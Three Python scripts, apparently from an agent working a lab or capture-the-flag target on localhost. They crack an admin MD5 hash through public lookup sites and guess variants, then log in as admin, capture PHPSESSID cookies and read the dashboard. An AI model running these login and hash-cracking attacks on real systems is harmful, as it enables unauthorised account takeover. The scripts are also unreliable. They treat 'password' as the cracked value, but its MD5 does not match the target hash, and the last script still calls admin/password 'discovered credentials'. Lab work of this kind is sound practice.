import hashlib
import requests
import re

target_hash = "7d39307ae824e70052c0aa16816a9b16"

print(f"[+] Target MD5: {target_hash}")
print(f"[+] Checking hash length: {len(target_hash)} chars")
print(f"[+] Checking if hex: {all(c in '0123456789abcdef' for c in target_hash)}")

# Try online hash lookup services
cracked = None

# Try nitrxgen API
try:
    print(f"\n[+] Trying nitrxgen.net...")
    resp = requests.get(f"https://www.nitrxgen.net/md5db/{target_hash}", timeout=15)
    if resp.status_code == 200 and resp.text and target_hash not in resp.text.lower():
        cracked = resp.text.strip()
        print(f"[!] Found: {cracked}")
except Exception as e:
    print(f"[-] nitrxgen error: {e}")

# Try md5.gromweb.com
try:
    print(f"\n[+] Trying md5.gromweb.com...")
    resp = requests.get(f"https://md5.gromweb.com/?md5={target_hash}", timeout=15)
    if resp.status_code == 200:
        # Look for the result in the HTML
        match = re.search(r'<em class="long-content string">(.*?)</em>', resp.text)
        if match:
            cracked = match.group(1)
            print(f"[!] Found: {cracked}")
        else:
            print(f"[-] No result found")
except Exception as e:
    print(f"[-] gromweb error: {e}")

# Try md5hashing.net
try:
    print(f"\n[+] Trying md5hashing.net...")
    resp = requests.get(f"https://md5hashing.net/hash/md5/{target_hash}", timeout=15)
    if resp.status_code == 200:
        # Look for the decrypted value
        if 'String to hash' in resp.text:
            # Check page content
            soup_match = re.search(r'<td class="field">Decrypted hash</td>.*?<td[^>]*>(.*?)</td>', resp.text, re.DOTALL)
            if soup_match:
                cracked = re.sub(r'<[^>]+>', '', soup_match.group(1)).strip()
                print(f"[!] Found: {cracked}")
except Exception as e:
    print(f"[-] md5hashing error: {e}")

# Try if the hash value itself is the password (sometimes happens)
if not cracked:
    print(f"\n[+] Checking if hash is the password itself...")
    if hashlib.md5(target_hash.encode()).hexdigest() == target_hash:
        print(f"[!] The hash equals its own MD5! Password = '{target_hash}'")
        cracked = target_hash

# Try common patterns with the hash value
if not cracked:
    print(f"\n[+] Trying patterns involving the hash...")
    test_values = [
        target_hash.upper(),
        target_hash[:8],
        target_hash[:12],
        target_hash[-8:],
        target_hash[-12:],
    ]
    for val in test_values:
        if hashlib.md5(val.encode()).hexdigest() == target_hash:
            print(f"[!] Found: '{val}'")
            cracked = val
            break

if not cracked:
    print(f"\n[-] Could not crack hash through online services")
    print(f"[-] Trying authentication with hash itself as password...")
    
    # Some applications store the hash and users enter the hash
    session = requests.Session()
    login_data = {
        'username': 'admin',
        'password': target_hash,
        'submit': 'submit'
    }
    
    try:
        resp = session.post("http://127.0.0.1:33038/index.php", data=login_data, allow_redirects=False, timeout=10)
        print(f"[+] Status: {resp.status_code}")
        print(f"[+] Body: {resp.text}")
        
        if 'Success' in resp.text or resp.status_code == 302:
            print(f"[!] The hash itself works as password!")
            cookies = session.cookies.get_dict()
            print(f"[+] Cookies: {cookies}")
    except Exception as e:
        print(f"[-] Error: {e}")

import hashlib
import requests

# The response from the server suggested the password
target_hash = "7d39307ae824e70052c0aa16816a9b16"

# The server response was {"response":"password"}
# Let's verify this is the actual password
test_password = "password"
calculated_hash = hashlib.md5(test_password.encode()).hexdigest()

print(f"[+] Target hash: {target_hash}")
print(f"[+] Testing if 'password' is the plaintext...")
print(f"[+] MD5('password') = {calculated_hash}")
print(f"[+] Match: {calculated_hash == target_hash}")

if calculated_hash == target_hash:
    print(f"\n[!] CRACKED! The password is: 'password'")
    
    # Now test authentication
    base_url = "http://127.0.0.1:33038"
    print(f"\n[+] Testing authentication...")
    
    session = requests.Session()
    login_data = {
        'username': 'admin',
        'password': 'password',
        'submit': 'submit'
    }
    
    resp = session.post(f"{base_url}/index.php", data=login_data, allow_redirects=False, timeout=10)
    
    print(f"[+] Status Code: {resp.status_code}")
    print(f"[+] Response Body: {resp.text}")
    print(f"[+] Response Headers: {dict(resp.headers)}")
    
    if 'Success' in resp.text:
        print(f"\n[!] AUTHENTICATION SUCCESSFUL!")
        cookies = session.cookies.get_dict()
        print(f"[+] Cookies: {cookies}")
        
        if 'PHPSESSID' in cookies:
            print(f"[+] PHPSESSID: {cookies['PHPSESSID']}")
        
        if 'Location' in resp.headers:
            print(f"[+] Redirect Location: {resp.headers['Location']}")
        
        # Try to access dashboard
        print(f"\n[+] Checking dashboard access...")
        dashboard_resp = session.get(f"{base_url}/dashboard.php")
        print(f"[+] Dashboard Status: {dashboard_resp.status_code}")
        print(f"[+] Dashboard Content Preview (first 500 chars):")
        print(dashboard_resp.text[:500])
    else:
        print(f"[-] Authentication returned unexpected response")
else:
    print(f"[-] 'password' is not the correct plaintext")
    print(f"[-] The server response may indicate something else")

import requests

base_url = "http://127.0.0.1:33038"

print(f"[+] Attempting authentication with discovered credentials")
print(f"[+] URL: {base_url}/index.php")
print(f"[+] Username: admin")
print(f"[+] Password: password")

session = requests.Session()
login_data = {
    'username': 'admin',
    'password': 'password',
    'submit': 'submit'
}

resp = session.post(f"{base_url}/index.php", data=login_data, allow_redirects=False, timeout=10)

print(f"\n[+] Status Code: {resp.status_code}")
print(f"[+] Response Body: {resp.text}")
print(f"[+] Response Headers: {dict(resp.headers)}")

if 'Success' in resp.text:
    print(f"\n[!] ===========================================")
    print(f"[!] AUTHENTICATION SUCCESSFUL!")
    print(f"[!] ===========================================")
    
    cookies = session.cookies.get_dict()
    print(f"\n[+] Session Cookies:")
    for name, value in cookies.items():
        print(f"[+]   {name}: {value}")
    
    if 'PHPSESSID' in cookies:
        print(f"\n[!] PHPSESSID: {cookies['PHPSESSID']}")
    
    if 'Location' in resp.headers:
        redirect = resp.headers['Location']
        print(f"\n[+] Next Step: Follow redirect to {redirect}")
        
        # Follow the redirect
        if redirect.startswith('/'):
            redirect_url = f"{base_url}{redirect}"
        else:
            redirect_url = redirect
        
        dash_resp = session.get(redirect_url)
        print(f"\n[+] Dashboard Response Status: {dash_resp.status_code}")
        print(f"[+] Dashboard Content Length: {len(dash_resp.text)}")
        print(f"\n[+] Dashboard Content (first 1000 chars):")
        print(dash_resp.text[:1000])
    else:
        print(f"\n[+] No redirect specified")
        
else:
    print(f"\n[-] Authentication may have failed")
    print(f"[-] Response did not contain 'Success'")

